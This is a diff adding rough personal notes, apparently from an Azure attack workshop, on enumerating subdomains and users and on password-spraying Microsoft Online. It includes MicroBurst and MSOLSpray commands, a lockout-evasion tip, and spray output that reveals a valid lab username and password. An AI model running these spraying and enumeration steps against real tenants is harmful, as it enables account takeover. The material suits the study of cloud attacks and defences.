@@ -347,3 +347,79 @@ ObjectId                             DisplayName                                
 
 ```
 
+### subdomain enumeration 
+usign AAD Internals
+
+INvoke-EnumerateAzureSubDomains -Base altotel  -Verbose
+IMport-Module '.\AzTools\MicroBurst-master\MicroBurst.psm1'
+
+Invoke-enumerateAzureSubDomains -Basealtotel -Verbose
+
+### user enumeration
+
+On way is t use the endpoint api
+login.miscrosoftonline.com/common/GetCredentialType
+
+IfExists - 0 valid account otherwise invalid
+
+### Initial access
+
+Password spraying 
+
+things to consider
+using a single password against multiple accounts
+Done against different API endpoints
+workaround account lockout
+Noisy!
+
+API
+https://login.microsoft.com/common/oauth2/token
+
+Invoke-MSOLSpray -UserList users.txt -Password "BH@Asia2023"
+ 
+```
+PS C:\Users\hacker\Desktop\Az-Tools> invoke-MSOLSpray -User users.txt.txt -Password "BH@Asia2023"
+[*] There are 7 total users to spray.
+[*] Now spraying Microsoft Online.
+[*] Current date and time: 06/01/2023 01:34:30
+[*] Got an error we haven't seen yet for user login.user
+{"error":"invalid_request","error_description":"AADSTS90019: No tenant-identifying information found in either the request or implied by any provided
+credentials.\r\nTrace ID: 0d9575fa-8e32-44ea-a840-b5baa1e4fd00\r\nCorrelation ID: 7f6d012c-9a18-4921-b769-e95fc048fb5d\r\nTimestamp: 2023-06-01
+01:34:30Z","error_codes":[90019],"timestamp":"2023-06-01 01:34:30Z","trace_id":"0d9575fa-8e32-44ea-a840-b5baa1e4fd00","correlation_id":"7f6d012c-9a18-4921-b7
+69-e95fc048fb5d","error_uri":"https://login.microsoft.com/error?code=90019"}
+[*] Got an error we haven't seen yet for user not.user
+{"error":"invalid_request","error_description":"AADSTS90019: No tenant-identifying information found in either the request or implied by any provided
+credentials.\r\nTrace ID: 6a70dbd3-ceef-4e6b-90c6-21888d02df00\r\nCorrelation ID: 4bf5eb70-040a-4bb0-b438-8272fd7aa365\r\nTimestamp: 2023-06-01
+01:34:30Z","error_codes":[90019],"timestamp":"2023-06-01 01:34:30Z","trace_id":"6a70dbd3-ceef-4e6b-90c6-21888d02df00","correlation_id":"4bf5eb70-040a-4bb0-b4
+38-8272fd7aa365","error_uri":"https://login.microsoft.com/error?code=90019"}
+[*] Got an error we haven't seen yet for user admin
+{"error":"invalid_request","error_description":"AADSTS90019: No tenant-identifying information found in either the request or implied by any provided
+credentials.\r\nTrace ID: 07bd7c8c-9c58-4238-9a1d-1ad69300c500\r\nCorrelation ID: 36908805-ba21-46cb-a936-b151dbcdf2b3\r\nTimestamp: 2023-06-01
+01:34:31Z","error_codes":[90019],"timestamp":"2023-06-01 01:34:31Z","trace_id":"07bd7c8c-9c58-4238-9a1d-1ad69300c500","correlation_id":"36908805-ba21-46cb-a9
+36-b151dbcdf2b3","error_uri":"https://login.microsoft.com/error?code=90019"}
+[*] Got an error we haven't seen yet for user pwd.spray
+{"error":"invalid_request","error_description":"AADSTS90019: No tenant-identifying information found in either the request or implied by any provided
+credentials.\r\nTrace ID: c23fc1bf-f03e-4ac6-8d15-f91f612efb00\r\nCorrelation ID: 42035489-25c0-4c63-8f2b-4e5de7717237\r\nTimestamp: 2023-06-01
+01:34:31Z","error_codes":[90019],"timestamp":"2023-06-01 01:34:31Z","trace_id":"c23fc1bf-f03e-4ac6-8d15-f91f612efb00","correlation_id":"42035489-25c0-4c63-8f
+2b-4e5de7717237","error_uri":"https://login.microsoft.com/error?code=90019"}
+[*] Got an error we haven't seen yet for user pwd.spray@alto.tel
+The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not
+complete. Specify the UseBasicParsing parameter and try again.
+[*] Got an error we haven't seen yet for user mfa.enabled
+{"error":"invalid_request","error_description":"AADSTS90019: No tenant-identifying information found in either the request or implied by any provided
+credentials.\r\nTrace ID: ef9599fd-c88c-4902-afb3-1ae83a9be000\r\nCorrelation ID: 5ee2836e-ed48-49cf-9c35-70f46378fe39\r\nTimestamp: 2023-06-01
+01:34:33Z","error_codes":[90019],"timestamp":"2023-06-01 01:34:33Z","trace_id":"ef9599fd-c88c-4902-afb3-1ae83a9be000","correlation_id":"5ee2836e-ed48-49cf-9c
+35-70f46378fe39","error_uri":"https://login.microsoft.com/error?code=90019"}
+[*] SUCCESS! mfa.enabled@alto.tel : BH@Asia2023 - NOTE: The response indicates MFA (Microsoft) is in u
+```
+
+the userame should be of the format mfa.enabled@alto.tel
+
+pwd.spray@alto.tel
+mobi.alto.tel
+
+how do you login
+
+
+
+
